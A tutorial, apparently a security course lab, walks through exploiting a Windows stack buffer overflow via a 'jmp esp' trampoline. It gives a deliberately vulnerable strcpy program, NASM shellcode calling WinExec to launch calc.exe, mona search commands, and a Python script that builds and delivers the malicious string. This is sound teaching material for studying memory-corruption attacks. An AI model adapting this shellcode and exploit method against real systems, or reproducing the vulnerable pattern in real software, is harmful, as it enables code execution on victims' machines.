# Buffer Overflow through jmp esp

In this buffer overflow example, a function f(.) other than main(.) is vulnerbale. f(.) has a small buffer, which may not be able to hold complete shellcode. Here are some notes particularly related to the malicious string as the command line argument that will be fed into a victim program.
* As the command line argument, the constructed malicious string cannot contain a null byte.
* The malcious string may want to avoid reserved symbols such as "<" for the Windows command line script.

### Overview

**Experiment setup**:
1. Windows 10 with all Exploit Protection disabled
2. [mingw-w64](http://mingw-w64.org/doku.php) installed
3. [nasm](https://www.nasm.us/) installed
4. [arwin](https://github.com/xinwenfu/arwin) installed
5. [Windows Sysinternals/listdlls](https://docs.microsoft.com/en-us/sysinternals/) installed

**buffer_strcpy2.c**: buffer_strcpy2.c uses the vulnerable strcpy() in a function f(), which copies the user input (from argv[1]) into a buffer *char foo[8]*. 
```
// buffer_strcpy2.c 
// gcc -o buffer_strcpy2.exe buffer_strcpy2.c
#include <stdio.h>
#include <string.h>

void f(char *str) {
  char foo[8];
  strcpy(foo, str);
}

void main(int argc, char **argv) {  
  f(argv[1]);
  return;
}
```
Below is f()'s disassembly.
```
.text:004015C0 ; Attributes: bp-based frame
.text:004015C0
.text:004015C0 ; int __cdecl f(char *)
.text:004015C0                 public _f
.text:004015C0 _f              proc near               ; CODE XREF: _main+19↓p
.text:004015C0
.text:004015C0 var_10          = byte ptr -10h
.text:004015C0 arg_0           = dword ptr  8
.text:004015C0
.text:004015C0                 push    ebp
.text:004015C1                 mov     ebp, esp
.text:004015C3                 sub     esp, 28h
.text:004015C6                 mov     eax, [ebp+arg_0]
.text:004015C9                 mov     [esp+4], eax    ; char *
.text:004015CD                 lea     eax, [ebp+var_10]
.text:004015D0                 mov     [esp], eax      ; char *
.text:004015D3                 call    _strcpy
.text:004015D8                 nop
.text:004015D9                 leave
.text:004015DA                 retn
.text:004015DA _f              endp
```
Below is f()'s stack frame, which can be discovered through Immunity Debugger or IDA.
```
        +----------------------+
        |                      |
        +----------------------+
        |                      |
        +----------------------+
        |        str           | 4 bytes
        +----------------------+
        |    return address    | 4 bytes
        +----------------------+
        |      old ebp         | 4 bytes
EBP ->  +----------------------+
        |                      | 4 bytes
        +----------------------+
        |                      | 4 bytes
        +----------------------+
        |                      | 4 bytes
        +----------------------+
        |                      | 4 bytes
        +----------------------+          <- foo 
```
It can be observed that there are only 20 bytes before the return address. 20 bytes may not be enough for shellcode. People may think we can put shellcode above the return address, which can be overwritten with the address of the shellcode. The malicious string can be constructed this way: *20 byte padding || address of shellcode || shellcode*. The problem is under Windows, the stack address starts with a null byte and the shellcode is on the stack. Therefore, the address of shellcode will contain a null byte, which will break the malicious string. strcpy() will not be able to copy the whole malicious string onto the stack and the attack will fail.

The trick we will use is: instead of using the shecllcode address to overwrite the return address, we will use an address of the *jmp esp* instruction in the operating system kernel. Immunity Debugger's plugin *mona* can help find such an instruction. The malicious string we will construct is: *20 byte padding || address of jmp esp || shecllcode*. Recall that exactly before f(.) returns (executing *retn*), ESP points to the return address. Now with the new malicious string, after *retn* executes, ESP points to the shecllcode. CPU runs the instruction at the return address, which is overwritten with the address of *jmp esp*. Therefore, *jmp esp* runs. Since ESP points to the shellcode, CPU will run the shecllcode next. The buffer overflow succeeds.

**shellcode_calc.asm**: The assembly code for shellcode, which pops up a caculator

**exploit2.py**: In the python code exploit2.py, we create a malocious string, which contains the padding, address of jmp esp, and shellcode, and put the malicious string into an environment variable. We then open a command shell, which inherits all environment variables including the one we just created. In the newly opened command shell, we feed the environment variable into a victim program as a command line argument, which causes the buffer overflow and pops up the calculator.

### Video demo

[![Video demo of attacking buffer_strcpy2.exe](https://img.youtube.com/vi/daUEEDTyLac/0.jpg)](https://youtu.be/daUEEDTyLac)


### Steps of buffer overflow through jmp esp

#### Step 1. Get WinExec's address
WinExec is an API in kernel32.dll. We need its address in the shellcode runing *calc.exe*, popping up the calclator. We can use the tool *arwin* to get its address in the computer memory. One limitation of this example is we need to manually get the address of WinExec. Moreover, Windows may load the system dlls such as kernel32.dll at a different address every time Windows restarts. Therefore, we have to get the address of WinExec every time Windows restarts. There are smart ways to automatically get the address of WinExec. But this example is kept simple so that you can see the basic principle of a buffer overflow attack clearly.

```
c:\Workshop>arwin kernel32.dll WinExec
arwin - win32 address resolution program - by steve hanna - v.01
WinExec is located at 0x74fccd30 in kernel32.dll
```

#### Step 2. Create shellcode

The shellcode in assembly language is shown below. In this line *mov eax, 7657cd30h*, 7657cd30h is the address of WinExec and shall be changed for your Windows session. WinExec's address changes everytime Windows restarts. If Windows does not restart, its address does not change.

```  
;COMPILE: nasm.exe -f win32 shellcode_calc.asm -o shellcode_calc.obj
;LINK: GoLink.exe /console /entry _start shellcode_calc.obj
;IF THE obj FILE IS NOT CREATED WITH THE -f win32 GoLink will COMPLAIN
 
;Tested and coded on Win10

[BITS 32]           ; Specifying target processor mode 32 bits

[SECTION .text]     ; Declare text/code section
global _start       ; Declare entry point
_start:             ; Entry point

;Push the string "calc.exe\0" onto stack
xor ecx,ecx     ; ecx=0
push ecx        ; push \0 (null string terminator) onto the stack
push 0x6578652e ; .exe; little endian; 2e(.) is put at lower address
push 0x636c6163 ; calc; little endian

mov ecx,esp     ; esp points to "calc.exe\0"
push 0x1        ; window style
push ecx        ; first argument for WinExec

mov eax, 7657cd30h  ; Address of WinExec; RVA=0x5dab0 within kernel32.dll; needs change
call eax            ; WinExec("calc.exe\0",1)

;exit clean
;xor ecx, ecx   ; ecx=0
;push ecx       ; argument or ExitProcess
;mov eax, 769b4100h ; RVA=0x258f0; The address of ExitProcess may have the \0 byte! e.g. 0x74f94100
;call eax           ; ExitProcess(0)
```

After creating the exe of the shellcode, load it into Immunity Debugger and use the binary copy functionality to get the binary code of the shellcode.

### Step 3. Find an address of jmp esp
Run Immunity Debugger and load a program such as shellcode_calc.exe. Run the following command and pick up an address of jmp esp. Sometimes, the address may contain a byte that corresponds to a special character. Since this address will become part of the command line argument, watch if there is any special character in the address if you have errors later.
```
!mona jmp -r esp -m kernel
```
![mona](./imgs/mona.PNG?raw=true "mona")

After you run mona, minimize the dsiassembly window and you shall see the result of running mona like something as follows.
![mona result](./imgs/monaresult.PNG?raw=true "mona result")


### Step 4. Create malicious string

exploit2.py below constructs the malicious string, which is *20 byte padding || address of jmp esp || shellcode*. *address of jmp esp* comes from Step 3 and *shellcode* comes from Step 2. Every time Windows restarts, *address of jmp esp* and *shellcode* change. They have to be changed everytime Windows restarts. Shellcode changes since the address of WinExec changes.

```
# python exploit2.py

import os   # import os module

# Create malicious string
malstring=b"\x61"*20    # padding; no need of change
malstring+=b"\xD2\x58\xD5\x75" # address of jmp esp; need change
# shellcode; need change
malstring+=b"\x31\xC9\x51\x68\x2E\x65\x78\x65\x68\x63\x61\x6C\x63\x89\xE1\x6A\x01\x51\xB8\x30\xCD\x50\x77\xFF\xD0"  

os.environ['TEST'] = malstring  # create environment variable holding mal-string

os.system('cmd')    # start a command shell, inheriting environment variable TEST
```

exploit2.py also creates the environment variable TEST, which holds the malicious string. exploit2.py then runs cmd.exe and pops up a command shell.

### Step 5. Attack
When we run *python exploit2.py*, it starts a command shell, which inherits the environment variable TEST. Now we can feed TEST, which is the malicious string we carefully constructed, into the vulnerable code buffer_strcpy2.exe. A calculator shall pop up.
```
c:\Workshop>python exploit2.py
Microsoft Windows [Version 10.0.19041.867]
(c) 2020 Microsoft Corporation. All rights reserved.

c:\Workshop>buffer_strcpy2.exe %TEST%
```

To see all environment variables, run *set*
```
c:\Workshop>set
... (removed other environment variables)
TEST=aaaaaaaaaaaaaaaaaaaaÒXÕu1ÉQh.exehcalc‰áj☺Q¸0ÍPwÿÐ
... (removed other environment variables)
```

